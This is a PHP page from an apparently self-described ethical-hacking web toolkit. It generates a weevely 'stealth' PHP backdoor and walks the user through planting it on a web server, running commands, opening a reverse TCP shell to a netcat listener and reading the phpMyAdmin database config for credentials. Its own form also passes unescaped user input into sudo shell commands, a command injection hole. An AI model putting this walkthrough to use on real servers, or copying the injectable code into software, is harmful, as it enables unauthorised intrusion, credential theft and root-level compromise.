<?php /***************************************************************************
 Copyright (C) 2014 Rakesh Pandey
 Written by Rakesh Pandey <rakeshpandey@karunya.edu.in>.
 
 This file is part of Penetration Testing Toolkit, a web interface for various ethical hacking tools.
 
 Penetration Testing Toolkit is free software; you can redistribute it and/or modify it 
 under the terms of the GNU General Public License as published by the Free
 Software Foundation; either version 2 of the License, or (at your option)
 any later version. 

 Penetration Testing Toolkit is distributed in the hope that it will be useful, but WITHOUT 
 ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
 FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
 more details.

 You should have received a copy of the GNU General Public License along
 with Penetration Testing Toolkit; if not, write to the Free Software Foundation, Inc.,
 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.
***************************************************************************/?>
<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
		
		
		
		
		<div class="clear"></div>
		
		<article class="module width_full">
			<header><h3><label>STEP 1:</label><b>Generate the php stealth backdoor</b></h3></header>
				<div class="module_content">
<form name="form1" action="" method="post">
    
						<fieldset>
							<label>Name of the backdoor</label>
                                                        <input type="text" name="name" id="ur" value="yourshell.php ">
                                                        
						</fieldset>
    <fieldset>
							<label>Enter password to use</label>
                                                        <input type="text" name="pass" id="ur" value="pentest">
                                                        
						</fieldset>
    <?php
    if(isset($_POST['submit'])){
        $name=$_POST['name'];
        $pass=$_POST['pass'];
        echo ' <div  id="dvProgress" runat="server">
        Please Wait ...<img src="veeru.gif" style="vertical-align: middle" alt="Processing" />
    </div> ';
        echo "<fieldset><label>Your Backdoor</label><br/>";
?><v id="dvprogress">
<?php
 echo '<p>Gnerating PHP Backdoor using weevely...</p>';
 shell("weevely generate $pass $name");
 exec("sudo mv $name exploits/$name");
 exec("sudo zip exploits/php.zip exploits/$name");
 echo '<p>Available for download in zip @  --><a href=exploits/php.zip>Click here</a></p>';
        echo '</fieldset>';
    }
    ?>
</v>
        	
						<div class="clear"></div>
				</div>
			<footer>
				<div class="submit_link">
					
                                    <input type="submit" name="submit" value="Generate" class="alt_btn" id="submit">
                                   <input type="reset" value="Reset" >
				</div>
			</footer>
		</article><!-- end of post new article -->
                
             <article class="module width_full">
			<header><h3><label>STEP 2:</label><b>Upload and start connection</b></h3></header>
				<div class="module_content">
<form name="form1" action="" method="post">
    <fieldset>
        <label>Step 2a.</label> Upload this PHP stealth web shell and backdoor to a web server (that support php)
    </fieldset>
     <fieldset>
         <label>Step 2b.</label>Suppose u’ve successfully uploaded the PHP backdoor with the address <b>http://192.168.2.29/upload/yourshell.php</b>
         where upload is the directory on the server where you uploaded your shell.<?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open Terminal  <a target='_blank' href='https://$host:4200/'>here</a></p>";?>

     </fieldset>
    <fieldset>
        <label>Step 2c.</label><b>Type in console:  </b>
        <code>weevely http://192.168.2.29/upload/yourshell.php pentest</code>
    </fieldset>
    
    <fieldset>
        <label>Step 2d.</label><b>www-data@192.168.2.29:  </b>
        <code>shell.sh ls</code><p>
        <b>Format :</b> shell.sh  system_command</p>
    </fieldset>
        <fieldset>
            <label>Step 2e.</label>Use NetCat to listen for an incoming connection in your attacker computer
            <?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open <a target='_blank' href='https://$host:4200/'>Terminal </a>and type:<code>  nc -l -v -p 23</code></p>";?>
    </fieldset>
    <fieldset>
        <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now  make a reverse TCP connection to our computer. 
       <p><b>Type:</b> <code>backdoor.reverse_tcp your_ip 23</code></p>
    </fieldset>
    <fieldset>
        <label>Step 2g.</label>If remote  server is a web server with MySQL database and PHPMyadmin installed.Try this in your 'netcat' terminal opened in <b>step 2E</b>
        <code>cat /etc/phpmyadmin/config-db.php</code>
    </fieldset>
     <fieldset>
         <label>Note:</label> Use google to know more about <b>weevely</b>
    </fieldset>
        
    
						<div class="clear"></div>
				</div>
			<footer>
				
			</footer>
		</article><!-- end of post new article -->
                

		
		

		<div class="spacer"></div>
	</section>
</body>
</html>
